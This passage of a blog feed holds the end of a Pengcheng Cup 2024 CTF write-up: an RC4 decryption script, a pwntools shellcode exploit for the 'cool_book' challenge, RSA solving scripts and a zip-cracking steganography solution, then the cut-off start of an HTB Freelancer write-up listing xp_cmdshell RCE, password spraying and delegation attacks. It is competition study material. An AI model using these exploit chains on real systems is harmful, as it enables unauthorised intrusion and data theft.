j=(j+S[i]+key[i%I])%256</span><br><span class="line">        S[i],S[j]=S[j],S[i]</span><br><span class="line">        <span class="attribute">z</span>=l(S)</span><br><span class="line">        n=[]</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> O:</span><br><span class="line">          n.append(k^s(z)+2)</span><br><span class="line">        return R(n)</span><br><span class="line"></span><br><span class="line">def E(s,parts_num):</span><br><span class="line">     <span class="attribute">Q</span>=d(s.decode())</span><br><span class="line">     <span class="attribute">S</span>=Q//parts_num</span><br><span class="line">     <span class="attribute">u</span>=Q%parts_num</span><br><span class="line">     W=[]</span><br><span class="line">     <span class="attribute">j</span>=0</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> g(parts_num):</span><br><span class="line">        <span class="attribute">T</span>=j+S</span><br><span class="line">        <span class="keyword">if</span> u&gt;0:</span><br><span class="line">            T+=1</span><br><span class="line">            <span class="attribute">u-</span>=1</span><br><span class="line">        W.append(s[j:T])</span><br><span class="line">        <span class="attribute">j</span>=T</span><br><span class="line">        return W</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="attribute">__name__</span>==&#x27;__main__&#x27;:</span><br><span class="line"> <span class="attribute">L</span>=o(&#x27;input the flag: &gt;&gt;&gt; <span class="string">&#x27;).encode()</span></span><br><span class="line"><span class="string"> assert d(L)%2==0,&#x27;</span>flag length should be even<span class="string">&#x27;</span></span><br><span class="line"><span class="string"> t=b&#x27;</span>v3ry_s3cr3t_p@ssw0rd<span class="string">&#x27;</span></span><br><span class="line"><span class="string"> O=E(L,2)</span></span><br><span class="line"><span class="string"> U=[]</span></span><br><span class="line"><span class="string"> for i in O:</span></span><br><span class="line"><span class="string">     U.append(N(t,i).hex())</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if U==[&#x27;</span>1796972c348bc4fe7a1930b833ff10a80ab281627731ab705dacacfef2e2804d74ab6bc19f60<span class="string">&#x27;,&#x27;</span>2ea999141a8cc9e47975269340c177c726a8aa732953a66a6af183bcd9cec8464a<span class="string">&#x27;]:</span></span><br><span class="line"><span class="string">    Y(&#x27;</span>Congratulations! You got the flag!<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">    print(&#x27;</span>Wrong flag!<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>所以exp为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="literal">True</span></span><br><span class="line">d = <span class="built_in">len</span></span><br><span class="line">G = <span class="built_in">list</span></span><br><span class="line">g = <span class="built_in">range</span></span><br><span class="line">s = <span class="built_in">next</span></span><br><span class="line">R = <span class="built_in">bytes</span></span><br><span class="line">Y = <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成器 l(S)（与加密时的相同）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">l</span>(<span class="params">S</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        K = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        <span class="keyword">yield</span> K</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># RC4 解密函数 N</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">N</span>(<span class="params">key, O</span>):</span><br><span class="line">    I = d(key)</span><br><span class="line">    S = G(g(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> g(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % I]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">    z = l(S)  <span class="comment"># 初始化生成器</span></span><br><span class="line">    n = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> O:</span><br><span class="line">        n.append(k ^ s(z) + <span class="number">2</span>)  <span class="comment"># 用生成器返回的伪随机数解密数据</span></span><br><span class="line">    <span class="keyword">return</span> R(n)  <span class="comment"># 返回解密后的字节对象</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">E</span>(<span class="params">s, parts_num</span>):</span><br><span class="line">    Q = d(s.decode())  </span><br><span class="line">    S = Q // parts_num </span><br><span class="line">    u = Q % parts_num  </span><br><span class="line">    W = []</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> g(parts_num):</span><br><span class="line">        T = j + S</span><br><span class="line">        <span class="keyword">if</span> u &gt; <span class="number">0</span>:</span><br><span class="line">            T += <span class="number">1</span>  </span><br><span class="line">            u -= <span class="number">1</span></span><br><span class="line">        W.append(s[j:T])</span><br><span class="line">        j = T</span><br><span class="line">    <span class="keyword">return</span> W  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">U</span>):</span><br><span class="line">    t = <span class="string">b&#x27;v3ry_s3cr3t_p@ssw0rd&#x27;</span>  </span><br><span class="line">    decrypted_parts = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> part <span class="keyword">in</span> U:</span><br><span class="line">        encrypted_bytes = <span class="built_in">bytes</span>.fromhex(part)  </span><br><span class="line">        decrypted_part = N(t, encrypted_bytes) </span><br><span class="line">        decrypted_parts.append(decrypted_part.decode())  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decrypted_parts)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    U = [</span><br><span class="line">        <span class="string">&#x27;1796972c348bc4fe7a1930b833ff10a80ab281627731ab705dacacfef2e2804d74ab6bc19f60&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;2ea999141a8cc9e47975269340c177c726a8aa732953a66a6af183bcd9cec8464a&#x27;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    flag = decrypt_flag(U)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Decrypted flag:&quot;</span>, flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/coxRB1u5g17MiI56.png!thumbnail" alt="img"></p><p>flag{thEn_I_Ca5_BE_YoUR_Onl7_ExeCUti6n_So_Use_m3_t0_R0n_tH17_Ex3Cuti0n}</p><h1>Pwn</h1><h2 id="cool-book">cool_book</h2><p>mprotect，可以想到shellcode</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/VnfkxlVV6q72RqRo.png!thumbnail" alt="img"></p><p>继续读代码，发现有数组越界,可以劫持程序流程，控制返回地址</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/Zk4fw8X50IxS3GKS.png!thumbnail" alt="img"></p><p>有沙盒</p><p><img src="https://uploader.shimo.im/f/fkpERjCXyRSJPraS.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE3MzEyNDMxMTUsImZpbGVHVUlEIjoiZ08zb2RQeU5WbnM2SndxRCIsImlhdCI6MTczMTI0MjgxNSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo5MTM0NDA5N30.KLNsbYR9RjX0zrp5lIjf_ZvUE8WJyWL4gZGilf7odb4" alt="img"></p><p>仅允许使用，open,read,write</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/GpRUam5wn2peOYDL.png!thumbnail" alt="img"></p><p>构造read读入orw</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./cool_book&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;192.168.18.25&quot;</span>, <span class="number">8888</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;addr=&quot;</span>)</span><br><span class="line">heap = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Heap Address: <span class="subst">&#123;<span class="built_in">hex</span>(heap)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">a</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;3.exit&quot;</span>, <span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, con</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;input idx&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">b&quot;input content&quot;</span>, con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;input idx&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode1 = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rsp,rbp</span></span><br><span class="line"><span class="string">    jmp rbp</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">shellcode2 = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov r8,0x67616c662f</span></span><br><span class="line"><span class="string">    sub rbp,0x30</span></span><br><span class="line"><span class="string">    jmp rbp</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">shellcode3 = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    push r8</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    sub rbp,0x30</span></span><br><span class="line"><span class="string">    jmp rbp</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">shellcode4 = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    sub rbp,0x30</span></span><br><span class="line"><span class="string">    jmp rbp</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">shellcode5 = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    sub rbp,0x30</span></span><br><span class="line"><span class="string">    jmp rbp</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">shellcode6 = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    sub rbp,0x30</span></span><br><span class="line"><span class="string">    jmp rbp</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">shellcode7 = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">    add(i, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode6))</span><br><span class="line"></span><br><span class="line">add(<span class="number">43</span>, shellcode7)</span><br><span class="line">add(<span class="number">44</span>, shellcode6)</span><br><span class="line">add(<span class="number">45</span>, shellcode5)</span><br><span class="line">add(<span class="number">46</span>, shellcode4)</span><br><span class="line">add(<span class="number">47</span>, shellcode3)</span><br><span class="line">add(<span class="number">48</span>, shellcode2)</span><br><span class="line">add(<span class="number">49</span>, shellcode1)</span><br><span class="line"></span><br><span class="line">choice(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1>Crypto</h1><h2 id="babyenc">babyenc</h2><p>需要分别解密两段flag</p><p>flag1需要构造恢复n获取</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">from</span> Crypto.Util.number import long_to_bytes</span><br><span class="line"><span class="attribute">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="attribute">e</span> =<span class="meta"> [43, 37, 53, 61, 59]</span></span><br><span class="line"><span class="attribute">c1</span> =<span class="meta"> [</span></span><br><span class="line"><span class="meta">    304054249108643319766233669970696347228113825299195899223597844657873869914715629219753150469421333712176994329969288126081851180518874300706117,</span></span><br><span class="line"><span class="meta">    300569071066351295347178153438463983525013294497692191767264949606466706307039662858235919677939911290402362961043621463108147721176372907055224,</span></span><br><span class="line"><span class="meta">    294806502799305839692215402958402593834563343055375943948669528217549597192296955202812118864208602813754722206211899285974414703769561292993531,</span></span><br><span class="line"><span class="meta">    255660645085871679396238463457546909716172735210300668843127008526613931533718130479441396195102817055073131304413673178641069323813780056896835,</span></span><br><span class="line"><span class="meta">    194084621856364235027333699558487834531380222896709707444060960982448111129722327145131992393643001072221754440877491070115199839112376948773978</span></span><br><span class="line"><span class="meta">]</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">a</span> = pow(c1[<span class="number">0</span>], e[<span class="number">1</span>]) - pow(c1[<span class="number">1</span>], e[<span class="number">0</span>])</span><br><span class="line"><span class="attribute">b</span> = pow(c1[<span class="number">2</span>], e[<span class="number">3</span>]) - pow(c1[<span class="number">3</span>], e[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="attribute">n1</span> = gmpy2.gcd(a, b)</span><br><span class="line"></span><br><span class="line"><span class="attribute">print</span>(long_to_bytes(n1 &gt;&gt; <span class="number">310</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/ga6h6FFz2jdktLys.png!thumbnail" alt="img"></p><p>flag2需要利用等式构造还原即可</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">from</span> Crypto.Util.number import long_to_bytes</span><br><span class="line"><span class="attribute">from</span> gmpy2 import *</span><br><span class="line"></span><br><span class="line"><span class="attribute">e</span> =<span class="meta"> [43, 37, 53, 61, 59]</span></span><br><span class="line"><span class="attribute">c2</span> =<span class="meta"> [</span></span><br><span class="line"><span class="meta">    12053085469218650692076937068797478047679005585690696222988148891925249697123080938461512785257424651119325211991331622346111396522606463631848519999574540677285771456451798811902760319940781754940936484802949729402283626052963389539032949160905330315285409948932070460455535716223838438994608837585387741418172014634472651248450564788332400265295308803291229281839428962457585593065595521459963501453576128172245723315811398209056633738967993602668795794847967331946516181453804430961308142497659799416125763566765485760600358126127595222197324155943818136202233758771243043559460620477085689770403810190118485243364,</span></span><br><span class="line"><span class="meta">    13878717704635179949812987989626985689079485417345626168168664941124566737996226347895779823781042724620099437593856913505609774929187720381745418166924229828643565384137488017127800518133460531729559408120123922005898834268035918798610962941606864727966963354615441094676621013036726097763695675723672289505864372820096404707522755617527884121630784469379311199256277022770033036782130954108210409787680433301426480762532000133464370267551845990395683108170721952672388388178378604502610341465223041534665133155077544973384500983410220955683686526835733853985930134970899200234404716865462481142496209914197674463932</span></span><br><span class="line"><span class="meta">]</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">b</span> = c2[<span class="number">0</span>] + c2[<span class="number">1</span>]</span><br><span class="line"><span class="attribute">c</span> = c2[<span class="number">0</span>] * c2[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="attribute">R</span>.&lt;x&gt; = Zmod(n)[] </span><br><span class="line"><span class="attribute">f</span> = x^<span class="number">2</span> - b * x + c</span><br><span class="line"></span><br><span class="line"><span class="attribute">print</span>(f.small_roots(X=<span class="number">2</span>^<span class="number">400</span>))</span><br><span class="line"><span class="comment"># [146436625375651639081292195233290471195543268962429]</span></span><br><span class="line"><span class="attribute">result</span> = long_to_bytes(<span class="number">146436625375651639081292195233290471195543268962429</span>)</span><br><span class="line"><span class="attribute">print</span>(result)</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241111083319749-1158999917.png" alt="img"></p><p>最后将flag拼一块即可：flag{3e99c26b-efdd-4cd2-bbe5-1420eaaa3b30}</p><h1>Misc</h1><h2 id="Simple-steganography">Simple_steganography</h2><p>首先附件拿7zip打开能看到3个文件，其他的只能看到两个文件，有一个图片被隐藏了</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/Pyu7MI0fDjMDvXBk.png!thumbnail" alt="img"></p><p>把图片打开再另存取出来后用foremost跑一下这个图片</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/6C4LvOgbOPqtTe07.png!thumbnail" alt="img"></p><p>里面有个000000000.jpg.没啥思路，再看看之前解出压缩包的文件有个hint.txt:a=7,b=35</p><p>可能是猫脸变化，上网搜一下脚本</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">import numpy as <span class="built_in">np</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def arnold(im_file, a, b, fn):</span><br><span class="line">    img = <span class="built_in">np</span>.<span class="built_in">array</span>(Image.open(im_file))</span><br><span class="line">    <span class="built_in">height</span>, <span class="built_in">width</span>, <span class="built_in">color</span> = img.shape</span><br><span class="line">    res_img = <span class="built_in">np</span>.zeros((<span class="built_in">height</span>, <span class="built_in">width</span>, <span class="built_in">color</span>), dtype=int)</span><br><span class="line">    a_b_plus_1 = a * b + <span class="number">1</span></span><br><span class="line">    negative_b = -b</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">height</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">width</span>):</span><br><span class="line">            new_j = (a_b_plus_1 * j - a * i) <span class="symbol">%</span> <span class="built_in">height</span></span><br><span class="line">            new_i = (negative_b * j + i) <span class="symbol">%</span> <span class="built_in">width</span></span><br><span class="line">            res_img[new_j, new_i] = img[j, i]</span><br><span class="line">    Image.fromarray(<span class="built_in">np</span>.uint8(res_img)).<span class="built_in">save</span>(fn)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    a = <span class="number">0x6f6c53</span></span><br><span class="line">    b = <span class="number">0x729e</span></span><br><span class="line">    arnold(<span class="string">&quot;D:\\phpstudy_pro\\WWW\\php\\测试\\00000000.jpg&quot;</span>, <span class="number">7</span>, <span class="number">35</span>, <span class="string">&quot;D:\\phpstudy_pro\\WWW\\php\\测试\\000000001.jpg&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>能得到后半部分flag</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/6o6ubzMV4ShGJN2Q.png!thumbnail" alt="img"></p><p>之后把图片文件头16进制放到a.txt,里面用bkcrack工具来进行明文爆破得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">f45dd89f</span> e3e929fb <span class="number">3202</span>ba17</span><br></pre></td></tr></table></figure><p>再利用该工具修改压缩包的密码为123456</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/pgTaL7zQNqp89zu7.png!thumbnail" alt="img"></p><p>解压即可得到flag.png,之后更改一下图片的宽高即可得到前半段flag</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/kEFaQYqpZJzKTp4n.png!thumbnail" alt="img"></p><p>两段flag一拼即可</p>]]></content>
    
    
    <summary type="html">鹏城杯 2024 Writeup</summary>
    
    
    
    <category term="Writeup" scheme="https://ya1orin.github.io/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://ya1orin.github.io/tags/CTF/"/>
    
    <category term="Competition" scheme="https://ya1orin.github.io/tags/Competition/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Freelancer</title>
    <link href="https://ya1orin.github.io/posts/8sdfch788.html"/>
    <id>https://ya1orin.github.io/posts/8sdfch788.html</id>
    <published>2024-10-30T11:15:05.000Z</published>
    <updated>2024-11-13T05:17:59.351Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.11.5</p></blockquote><h1>知识点</h1><ul><li>MSSQL通过xp_cmdshell 实现RCE</li><li>密码喷洒</li><li>滥用GenericWrite</li><li>RBCD约束委派</li><li>PTH传递攻击</li></ul><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.11.5</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 